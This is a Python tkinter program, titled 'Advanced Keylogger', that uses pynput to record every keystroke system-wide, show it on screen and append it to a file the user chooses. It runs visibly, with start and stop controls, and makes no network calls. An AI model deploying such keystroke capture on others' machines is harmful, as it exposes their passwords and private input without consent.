import tkinter as tk
from tkinter import filedialog, messagebox
from pynput import keyboard

class AdvancedKeyLogger:
    def __init__(self) -> None:
        self.log_file_path = ""
        self.logging_active = False
        self.key_logs = ""

        self.window = tk.Tk()
        self.window.title("Advanced Keylogger")

        self.text_display = tk.Text(self.window, wrap="word")
        self.text_display.pack(fill="both", expand=True)

        self.status_label = tk.Label(self.window, text="Logging Stopped", fg="red")
        self.status_label.pack(pady=5)

        self.start_btn = tk.Button(self.window, text="Start Logging", command=self.start_logging)
        self.start_btn.pack(side="left", padx=5, pady=5)

        self.stop_btn = tk.Button(self.window, text="Stop Logging", command=self.stop_logging, state="disabled")
        self.stop_btn.pack(side="left", padx=5, pady=5)

        self.clear_btn = tk.Button(self.window, text="Clear Logs", command=self.clear_logs)
        self.clear_btn.pack(side="left", padx=5, pady=5)

        self.file_btn = tk.Button(self.window, text="Choose File", command=self.choose_file)
        self.file_btn.pack(side="left", padx=5, pady=5)

    @staticmethod
    def get_key_character(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_key_press(self, key):
        try:
            char = self.get_key_character(key)
            self.key_logs += char
            self.text_display.insert(tk.END, char)
            self.text_display.see(tk.END)
            if self.log_file_path:
                with open(self.log_file_path, 'a') as log_file:
                    log_file.write(char)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to log key: {e}")

    def start_logging(self):
        try:
            if not self.logging_active:
                self.log_file_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                                                  filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
                if self.log_file_path:
                    self.logging_active = True
                    self.start_btn.config(state="disabled")
                    self.stop_btn.config(state="normal")
                    self.status_label.config(text="Logging Started", fg="green")
                    self.key_listener = keyboard.Listener(on_press=self.on_key_press)
                    self.key_listener.start()
                else:
                    messagebox.showwarning("No File", "No file selected for saving logs.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start logging: {e}")

    def stop_logging(self):
        try:
            if self.logging_active:
                self.logging_active = False
                self.start_btn.config(state="normal")
                self.stop_btn.config(state="disabled")
                self.status_label.config(text="Logging Stopped", fg="red")
                self.key_listener.stop()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to stop logging: {e}")

    def clear_logs(self):
        try:
            self.key_logs = ""
            self.text_display.delete(1.0, tk.END)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to clear logs: {e}")

    def choose_file(self):
        try:
            self.log_file_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                                              filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            if not self.log_file_path:
                messagebox.showwarning("No File", "No file selected for saving logs.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to choose file: {e}")

    def run(self):
        try:
            self.window.mainloop()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to run the application: {e}")

if __name__ == '__main__':
    try:
        keylogger = AdvancedKeyLogger()
        keylogger.run()
    except Exception as e:
        messagebox.showerror("Error", f"Application encountered an error: {e}")
